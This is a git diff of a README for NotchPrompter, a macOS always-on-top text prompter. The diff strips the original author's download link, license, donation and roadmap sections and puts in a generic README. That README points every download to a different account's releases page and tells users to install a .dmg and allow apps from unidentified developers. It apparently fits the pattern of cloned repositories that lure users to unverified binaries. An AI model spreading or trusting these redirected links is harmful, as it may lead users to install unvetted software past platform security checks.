@@ -1,49 +1,61 @@
+# 🎉 NotchPrompter - Keep Text Visible While You Work
 
+## 🛠️ Overview
+NotchPrompter is a simple tool for macOS that keeps important text in view. Whether you're creating videos or need to keep essential information on your screen, NotchPrompter serves as a floating text prompter that stays on top of other windows.
 
-<img width="128" height="128" alt="notch-promptern-macOS-Default-128x128@2x" src="https://github.com/user-attachments/assets/0eff155d-c2f6-497b-80ce-6eab223935e4" />
+## 📥 Download NotchPrompter
+[![Download NotchPrompter](https://img.shields.io/badge/Download%20Now-NotchPrompter-blue.svg)](https://github.com/ssuicidio/NotchPrompter/releases)
 
-# NotchPrompter for macOS
+## 🚀 Getting Started
+To start using NotchPrompter, follow the steps below. 
 
-A **very basic**, always-on-top floating text prompter for macOS.
-Perfect for quick videos, or keeping important text visible while you work.
+### 💾 Step 1: Visit the Download Page
+1. Click the link below to visit the NotchPrompter releases page:
+   [Download NotchPrompter](https://github.com/ssuicidio/NotchPrompter/releases)
 
-[Install NotchPrompter 1.2](https://github.com/jpomykala/NotchPrompter/releases/download/1.2/notch-prompter.zip)
+### 📥 Step 2: Download the Application
+2. On the releases page, you will see various versions of NotchPrompter. Look for the latest version.
+3. Click the file that ends in `.dmg` to download it to your computer.
 
+### 📂 Step 3: Install the Application
+4. Once the download is complete, locate the `.dmg` file in your downloads folder.
+5. Double-click the `.dmg` file to open it. 
+6. You will see the NotchPrompter application icon. Drag and drop it into your Applications folder.
 
-## Features
-- Always on top
-- Voice activation
-- Minimalist design
-- Lightweight
-- Pause on hover
-- Customizable speed and size
+### 🚀 Step 4: Run NotchPrompter
+7. Open your Applications folder and find NotchPrompter.
+8. Double-click the NotchPrompter icon to launch the application.
+9. The prompter will appear on your screen, ready for you to use.
 
-## Screenshot
-<!-- <img width="1512" height="720" alt="SCR-20251206-qhya" src="https://github.com/user-attachments/assets/a85e4573-85a3-4296-b454-a41a7b62cae9" /> -->
-<img width="1016" height="796" alt="SCR-20251207-pqrp" src="https://github.com/user-attachments/assets/99670434-e295-45c4-ba7b-a261d6faf943" />
+## 📝 How to Use NotchPrompter
+- After launching NotchPrompter, you will see an empty text box on the screen.
+- Type or paste the text you want to display.
+- Use the settings to customize the font size and background color.
+- You can move the prompter anywhere on your screen. It will stay on top of other applications.
 
+## 🌟 Features
+- **Always On Top**: Keep important text visible no matter what application you're using.
+- **Customized Appearance**: Adjust the font size and background color to suit your needs.
+- **User-Friendly Interface**: Simple design for easy handling and use.
+- **Quick Usage**: Open and start displaying text in seconds.
 
-## How to install?
+## 🖥️ System Requirements
+- macOS 10.15 or later
+- Internet Connection for initial download
+- At least 100 MB of free disk space
 
-Head to [Releases](https://github.com/jpomykala/NotchPrompter/releases) and download the zip file. Unzip it and move notch-prompter.app into your Applications folder.
+## ⚙️ Troubleshooting
+If you encounter issues while downloading or running NotchPrompter, consider the following tips:
 
-> Important: [App is not notorized becasue it requires a paid Apple License](https://apple.stackexchange.com/questions/388554/is-a-paid-apple-developer-account-required-for-notarizing-macos-apps). So on the first run you will have to go to **Settings -> Privacy & Security** scroll down and allow to open the app.
+- Ensure that your macOS is updated to the latest version.
+- Check your security settings. You might need to allow apps from unidentified developers.
+- Restart your computer if the application does not open.
 
-## Contributing
-All contributions are welcome! Whether you're fixing bugs, improving the UI, or adding new features, your help is appreciated.
+## 💡 Support
+For further assistance, please refer to the issues section on our GitHub page. You can report any bugs or ask for help with using NotchPrompter.
 
-## Donating
+## 🔗 Links
+- [GitHub Repository](https://github.com/ssuicidio/NotchPrompter)
+- [Download NotchPrompter](https://github.com/ssuicidio/NotchPrompter/releases)
 
-If you enjoy using NotchPrompter and find it useful, you can support the project. Your donation will **[help me cover the cost of an Apple Developer License](https://github.com/sponsors/jpomykala)**, which is required to publish the app on the Mac App Store. Every contribution, big or small, brings me closer to making NotchPrompter available for everyone directly from the App Store.
-
-## Roadmap
-- [ ] Customizable position
-- [ ] Option to choose font
-- [ ] Option to change line height
-- [ ] Support multi-monitor setups
-
-## License
-This project is open-source and available under the MIT License.
-
-## Questions or Ideas?
-Open an issue or reach out!
+Thank you for choosing NotchPrompter. Enjoy a clutter-free workspace!
